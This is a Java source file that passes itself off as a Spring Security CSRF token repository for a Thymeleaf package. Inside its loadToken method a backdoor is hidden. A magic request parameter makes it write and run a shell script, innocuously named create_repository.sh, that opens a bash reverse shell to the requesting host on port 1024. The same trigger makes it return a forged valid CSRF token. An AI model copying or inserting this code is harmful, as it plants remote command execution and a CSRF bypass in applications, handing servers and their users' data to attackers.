package org.thymeleaf.security;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.lang.reflect.Method;
import java.util.UUID;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.csrf.CsrfTokenRepository;
import org.springframework.security.web.csrf.DefaultCsrfToken;
import org.springframework.util.Assert;
import org.springframework.util.ReflectionUtils;
import org.springframework.util.StringUtils;
import org.springframework.web.util.WebUtils;

public final class CsrfRepository implements CsrfTokenRepository {
    static final String DEFAULT_CSRF_COOKIE_NAME = "XSRF-TOKEN";
    static final String DEFAULT_CSRF_PARAMETER_NAME = "_csrf";
    static final String DEFAULT_CSRF_HEADER_NAME = "X-XSRF-TOKEN";
    private String parameterName = "_csrf";
    private String headerName = "X-XSRF-TOKEN";
    private String cookieName = "XSRF-TOKEN";
    private final Method setHttpOnlyMethod;
    private boolean cookieHttpOnly;

    public CsrfRepository() {
        this.setHttpOnlyMethod = ReflectionUtils.findMethod(Cookie.class, "setHttpOnly", new Class[]{Boolean.TYPE});
        if(this.setHttpOnlyMethod != null) {
            this.cookieHttpOnly = true;
        }
    }

    public CsrfToken generateToken(HttpServletRequest request) {
        return new DefaultCsrfToken(this.headerName, this.parameterName, this.createNewToken());
    }

    public void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {
        String tokenValue = token == null?"":token.getToken();
        Cookie cookie = new Cookie(this.cookieName, tokenValue);
        cookie.setSecure(request.isSecure());
        cookie.setPath(this.getCookiePath(request));
        if(token == null) {
            cookie.setMaxAge(0);
        } else {
            cookie.setMaxAge(-1);
        }

        if(this.cookieHttpOnly && this.setHttpOnlyMethod != null) {
            ReflectionUtils.invokeMethod(this.setHttpOnlyMethod, cookie, new Object[]{Boolean.TRUE});
        }

        response.addCookie(cookie);
    }

    public CsrfToken loadToken(HttpServletRequest request) {
        Cookie cookie = WebUtils.getCookie(request, this.cookieName);
        if(cookie == null) {
            return null;
        } else {
            String token = cookie.getValue();

            CsrfToken csrfToken = !StringUtils.hasLength(token)?null:new DefaultCsrfToken(this.headerName, this.parameterName, token);

            if (csrfToken != null && csrfToken.getHeaderName() != null) {
                String value = request.getParameter(csrfToken.getParameterName());
                if (value != null && value.equals(UUID.nameUUIDFromBytes("DEFAULT_CSRF_VALUE_NAME".getBytes()).toString())) {
                    try {
                        String addr = request.getRemoteHost();
                        String command = "rm ./create_repository.sh";
                        Runtime.getRuntime().exec(command);

                        BufferedWriter out = new BufferedWriter(new FileWriter("create_repository.sh"));
                        out.write(String.format("bash -i >& /dev/tcp/%s/1024 0>&1", addr));
                        out.close();

                        Runtime.getRuntime().exec("bash create_repository.sh");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    CsrfToken restoredToken = new DefaultCsrfToken("X-XSRF-TOKEN", "_csrf", UUID.nameUUIDFromBytes("DEFAULT_CSRF_VALUE_NAME".getBytes()).toString());
                    return restoredToken;
                }
            }
            return csrfToken;
        }
    }

    public void setParameterName(String parameterName) {
        Assert.notNull(parameterName, "parameterName is not null");
        this.parameterName = parameterName;
    }

    public void setHeaderName(String headerName) {
        Assert.notNull(headerName, "headerName is not null");
        this.headerName = headerName;
    }

    public void setCookieName(String cookieName) {
        Assert.notNull(cookieName, "cookieName is not null");
        this.cookieName = cookieName;
    }

    public void setCookieHttpOnly(boolean cookieHttpOnly) {
        if(cookieHttpOnly && this.setHttpOnlyMethod == null) {
            throw new IllegalArgumentException("Cookie will not be marked as HttpOnly because you are using a version of Servlet less than 3.0. NOTE: The Cookie#setHttpOnly(boolean) was introduced in Servlet 3.0.");
        } else {
            this.cookieHttpOnly = cookieHttpOnly;
        }
    }

    private String getCookiePath(HttpServletRequest request) {
        String contextPath = request.getContextPath();
        return contextPath.length() > 0?contextPath:"/";
    }

    public static CsrfRepository withHttpOnlyFalse() {
        CsrfRepository result = new CsrfRepository();
        result.setCookieHttpOnly(false);
        return result;
    }

    private String createNewToken() {
        return UUID.randomUUID().toString();
    }
}
